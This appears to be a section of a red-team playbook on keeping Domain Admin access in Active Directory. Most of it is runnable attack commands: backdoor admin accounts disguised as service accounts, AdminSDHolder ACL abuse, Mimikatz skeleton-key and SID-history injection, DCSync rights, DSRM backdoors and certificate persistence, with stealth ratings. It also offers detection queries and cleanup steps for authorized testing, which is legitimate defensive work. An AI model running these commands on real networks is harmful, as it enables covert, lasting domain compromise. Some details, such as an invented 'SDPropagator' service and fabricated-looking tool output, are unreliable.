## 7. Persistence Mechanisms

Once Domain Admin access is achieved, establishing persistence ensures continued access even if initial compromise vectors are remediated. This section covers techniques to maintain long-term access to the Active Directory environment.

> [!CAUTION] > **Ethical Consideration:** Persistence mechanisms should only be deployed during authorized red team engagements with explicit client approval. Always document and remove all persistence at engagement conclusion.

### 7.1 Backdoor Accounts

**Objective:** Create hidden or privileged accounts that persist after initial compromise is remediated.

#### Creating Backdoor Domain Admin

**Technique:** Create a new user account and add to Domain Admins group.

**Manual Creation:**

```bash
# Using net command (from Windows with DA)
net user backdoor.svc P@ssw0rd123! /add /domain
net group "Domain Admins" backdoor.svc /add /domain

# Using PowerShell
New-ADUser -Name "BackdoorSvc" -SamAccountName "backdoor.svc" \
  -AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) \
  -Enabled $true
Add-ADGroupMember -Identity "Domain Admins" -Members "backdoor.svc"

# Using Impacket (Linux)
adduser.py -user-pass P@ssw0rd123! -user backdoor.svc \
  contoso.local/administrator:Password123@DC01
```

**Expected Output:**

```
[+] User created: backdoor.svc
[+] Added to Domain Admins
[+] Account enabled
[!] WARNING: Easily detectable, use with caution
```

**OPSEC Considerations:**

- **Detection Likelihood:** **HIGH**
- **IOCs:**
  - Event ID 4720 (User account created)
  - Event ID 4728 (Member added to security-enabled global group)
  - New unusual username in Domain Admins

**Stealthier Approach: Hidden Admin Account**

```powershell
# Create user with similar name to existing service account
New-ADUser -Name "svc-sqlbackup " -SamAccountName "svc.sqlbackup" \
  -Description "SQL Server Backup Service" \
  -AccountPassword (ConvertTo-SecureString "ComplexP@ss123!" -AsPlainText -Force) \
  -Enabled $true

# Add to Domain Admins
Add-ADGroupMember -Identity "Domain Admins" -Members "svc.sqlbackup"

# Set account to not show in GAL (Exchange environments)
Set-ADUser -Identity "svc.sqlbackup" -Replace @{msExchHideFromAddressLists=$true}
```

**Success Metrics:**

- Backdoor account created
- Account has Domain Admin privileges
- Account persists after primary credentials changed

**Cleanup Procedure (Post-Engagement):**

```bash
# Remove backdoor account
net user backdoor.svc /delete /domain

# Verify removal
net user backdoor.svc /domain
# Should return: "User not found"
```

#### AdminSDHolder Persistence

**Technique:** Add user to AdminSDHolder protected groups for persistent privileges.

**What is AdminSDHolder?**

AdminSDHolder is an AD object that acts as a template for protected groups (Domain Admins, Enterprise Admins, etc.). Every 60 minutes, the SDProp process resets ACLs on protected group members to match AdminSDHolder.

**Attack:**

```powershell
# Add backdoor user to AdminSDHolder's ACL
$user = Get-ADUser -Identity "backdoor.svc"
$acl = Get-Acl "AD:\CN=AdminSDHolder,CN=System,DC=contoso,DC=local"

$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
  $user.SID,
  "GenericAll",
  "Allow"
)

$acl.AddAccessRule($ace)
Set-Acl -Path "AD:\CN=AdminSDHolder,CN=System,DC=contoso,DC=local" -AclObject $acl

# Wait 60 minutes for SDProp to run, or force it:
Invoke-Command -ComputerName DC01 {
  Start-Service -Name "SDPropagator"
}
```

**Success Metrics:**

- ACL added to AdminSDHolder
- User gains permanent admin rights
- Rights persist even if removed from Domain Admins

**Detection:**

```powershell
# Query AdminSDHolder ACL
Get-Acl "AD:\CN=AdminSDHolder,CN=System,DC=contoso,DC=local" |
  Select-Object -ExpandProperty Access |
  Where-Object {$_.IdentityReference -notlike "NT AUTHORITY\*"}
```

**OPSEC Rating:** **Medium** - Less commonly checked than group memberships.

### 7.2 Skeleton Keys and Directory Replication

#### Skeleton Key Attack

**Objective:** Inject a master password into domain controller's LSASS that works for all accounts.

**Prerequisites:** Domain Admin access to DC.

**Attack (Using Mimikatz):**

```bash
# On Domain Controller (requires SYSTEM)
mimikatz # privilege::debug
mimikatz # misc::skeleton

# Expected output:
# [+] Skeleton key installed successfully
# [+] Master password: mimikatz
```

**Using the Skeleton Key:**

```bash
# Any account can now authenticate with "mimikatz" password
# Original passwords still work

# Example:
net use \\DC01\C$ /user:contoso\administrator mimikatz
# Works even if administrator's real password is different
```

**Success Metrics:**

- Skeleton key injected into LSASS
- Master password works for all accounts
- Original passwords remain functional

**OPSEC Considerations:**

- **Detection Likelihood:** **HIGH**
- **Persistence:** **Until DC reboots**
- **IOCs:**
  - LSASS memory modification
  - Unusual authentication patterns
  - Event ID 4673 (Sensitive privilege use)

**Limitations:**

- Lost on DC reboot
- Requires re-injection after reboot
- Detectable by memory forensics

#### DCSync Rights Persistence

**Technique:** Grant DCSync rights to compromised account for persistent credential dumping.

**Attack:**

```powershell
# Grant Replicating Directory Changes rights
Add-DomainObjectAcl -TargetIdentity "DC=contoso,DC=local" \
  -PrincipalIdentity "backdoor.svc" \
  -Rights DCSync

# Now backdoor.svc can dump all domain credentials anytime
secretsdump.py contoso.local/backdoor.svc:Password123@DC01
```

**Success Metrics:**

- DCSync rights granted
- Account can dump NTDS.dit remotely
- Persistent credential access

**Detection:**

```powershell
# Check for unusual DCSync rights
Get-DomainObjectAcl -SearchBase "DC=contoso,DC=local" |
  Where-Object {
    ($_.ObjectAceType -match 'replication') -and
    ($_.SecurityIdentifier -match '^S-1-5-21-')
  }
```

**OPSEC Rating:** **Medium** - Less obvious than Domain Admin membership.

### 7.3 AdminSDHolder Abuse (Detailed)

**Objective:** Leverage AdminSDHolder for stealthy, persistent administrative access.

**Attack Flow:**

```
┌────────────────────────────────────────────────────┐
│       AdminSDHolder Abuse Attack Flow              │
├────────────────────────────────────────────────────┤
│ 1. Achieve Domain Admin access                    │
│ 2. Modify AdminSDHolder ACL to grant rights       │
│ 3. Wait for SDProp (60 min) or force propagation  │
│ 4. Backdoor user now has persistent admin rights  │
│ 5. Rights persist even if removed from groups     │
└────────────────────────────────────────────────────┘
```

**Full Implementation:**

```powershell
# Step 1: Create backdoor account (blend in)
New-ADUser -Name "svc-replication" -SamAccountName "svc.replication" \
  -Description "Directory Replication Service Account" \
  -AccountPassword (ConvertTo-SecureString "Str0ngP@ss456!" -AsPlainText -Force) \
  -Enabled $true

# Step 2: Grant FullControl on AdminSDHolder
$user = Get-ADUser -Identity "svc.replication"
$adminsdholder = "AD:\CN=AdminSDHolder,CN=System,DC=contoso,DC=local"
$acl = Get-Acl $adminsdholder

$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
  $user.SID,
  [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
  [System.Security.AccessControl.AccessControlType]::Allow
)

$acl.AddAccessRule($ace)
Set-Acl -Path $adminsdholder -AclObject $acl

# Step 3: Force SDProp to run immediately (optional)
# Normally runs every 60 minutes
Invoke-Command -ComputerName DC01 {
  Import-Module ActiveDirectory
  $rootDSE = Get-ADRootDSE
  $rootDSE.RunProtectAdminGroupsTask = 1
  $rootDSE.CommitChanges()
}

# Step 4: Verify persistence
# User now has GenericAll on all protected groups
# Can add self to Domain Admins anytime:
Add-ADGroupMember -Identity "Domain Admins" -Members "svc.replication"
```

**Success Metrics:**

- Backdoor user ACL added to AdminSDHolder
- SDProp propagated changes
- User can grant self admin rights at will

**Remediation Detection:**

```powershell
# Audit script to detect AdminSDHolder abuse
$adminsdholder = Get-Acl "AD:\CN=AdminSDHolder,CN=System,DC=contoso,DC=local"
$suspicious = $adminsdholder.Access | Where-Object {
  $_.IdentityReference -notmatch "(Domain Admins|Enterprise Admins|Administrators)" -and
  $_.ActiveDirectoryRights -match "GenericAll"
}

if ($suspicious) {
  Write-Warning "Suspicious ACL detected on AdminSDHolder:"
  $suspicious | Select-Object IdentityReference, ActiveDirectoryRights
}
```

**Cleanup (Post-Engagement):**

```powershell
# Remove backdoor ACL from AdminSDHolder
$user = Get-ADUser -Identity "svc.replication"
$adminsdholder = "AD:\CN=AdminSDHolder,CN=System,DC=contoso,DC=local"
$acl = Get-Acl $adminsdholder

$acl.Access | Where-Object {$_.IdentityReference -eq $user.SID} |
  ForEach-Object {$acl.RemoveAccessRule($_)}

Set-Acl -Path $adminsdholder -AclObject $acl

# Delete backdoor account
Remove-ADUser -Identity "svc.replication" -Confirm:$false
```

---

## Additional Persistence Techniques

### AD CS (Certificate Services) Persistence

**Technique:** Request certificate with long validity for authentication.

```bash
# Using Certipy
certipy req -u administrator@contoso.local -p Password123 \
  -ca CONTOSO-CA -template User -upn administrator@contoso.local

# Certificate valid for 1 year, can authenticate even if password changes
certipy auth -pfx administrator.pfx -dc-ip 192.168.10.10
```

**Success Metrics:**

- Certificate issued with long validity
- Certificate can authenticate after password change
- Persistent access for certificate lifetime

### SID History Injection

**Technique:** Add Domain Admin SID to user's SID history for privilege escalation.

```powershell
# Using Mimikatz
mimikatz # privilege::debug
mimikatz # sid::patch
mimikatz # sid::add /user:backdoor.svc /sid:S-1-5-21-...-512

# User now has Domain Admin rights via SID history
```

**Success Metrics:**

- SID history modified
- User has admin rights without group membership
- Highly stealthy

**OPSEC Rating:** **Low Detection** - SID history rarely audited.

### DSRM Password Persistence

**Technique:** Reset Directory Services Restore Mode (DSRM) password for DC backdoor access.

```bash
# On DC, set DSRM password
ntdsutil
set dsrm password
reset password on server DC01
<new_password>
quit
quit

# Enable DSRM logon for network authentication
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2

# Authenticate with DSRM account (local admin on DC)
wmiexec.py ./Administrator:DsrmP@ss@DC01
```

**Success Metrics:**

- DSRM password reset
- Network logon enabled
- Local admin backdoor on DC

---

## Persistence Decision Matrix

```
┌─────────────────────────────────────────────┐
│ Level of stealth required?                 │
└──────────┬──────────────────────────────────┘
           │
           ├─ LOW STEALTH (Quick and dirty)
           │  └─ Backdoor Domain Admin account
           │  └─ Golden Ticket
           │
           ├─ MEDIUM STEALTH (Blend in)
           │  └─ Service account with similar name
           │  └─ DCSync rights on normal user
           │  └─ AD CS certificate
           │
           └─ HIGH STEALTH (Advanced persistence)
              └─ AdminSDHolder ACL abuse
              └─ SID History injection
              └─ DSRM password on DC
```

**Best Practices for Persistence:**

1. **Multiple Layers:** Deploy 2-3 different persistence mechanisms
2. **Blend In:** Use names that match existing naming conventions
3. **Limit Privileges:** Don't make everything Domain Admin
4. **Document Everything:** Track all persistence for post-engagement removal
5. **Set Alerts:** Create detection rules to show client how to find your persistence

**Post-Engagement Cleanup Checklist:**

- [ ] Remove all backdoor accounts
- [ ] Revert AdminSDHolder ACL changes
- [ ] Delete golden/silver tickets from systems
- [ ] Remove DCSync rights from non-admin accounts
- [ ] Reset DSRM password to unknown value
- [ ] Remove AD CS certificates issued for persistence
- [ ] Verify cleanup with client before engagement conclusion

---

## Reporting Persistence Findings

When documenting persistence in the final report, include:

1. **Technique Used:** Name and description
2. **Detection Difficulty:** Low/Medium/High
3. **Remediation Steps:** Exact commands to remove
4. **Detection Methods:** How to find similar persistence
5. **Prevention:** Configuration changes to prevent recurrence

**Example Report Entry:**

````markdown
### Finding: AdminSDHolder ACL Persistence

**Severity:** CRITICAL
**CVSS Score:** 9.8
**Detection Difficulty:** Medium

**Description:**
During the engagement, a backdoor service account (svc.replication) was granted
GenericAll permissions on the AdminSDHolder object. This provides persistent
administrative access that survives credential resets and group membership changes.

**Impact:**
The backdoor account can grant itself Domain Admin privileges at any time,
allowing persistent domain compromise even after remediation of initial attack vectors.

**Remediation:**

1. Remove unauthorized ACL from AdminSDHolder:
   ```powershell
   # [Exact PowerShell commands]
   ```
````

2. Delete backdoor account:

   ```powershell
   Remove-ADUser -Identity "svc.replication"
   ```

3. Force SDProp to propagate clean ACLs:
   ```powershell
   # [Exact commands]
   ```

**Detection:**
Monitor AdminSDHolder ACL changes (Event ID 5136) and periodically audit:

```powershell
# [Detection script]
```

**Prevention:**

1. Implement privileged access management (PAM)
2. Enable MFA for all administrative accounts
3. Regular audits of AdminSDHolder ACLs
4. Implement Azure AD Privileged Identity Management

```

**Next Steps:**

After establishing persistence, conduct final testing, verify all findings, and proceed to reporting (Section 9).
```
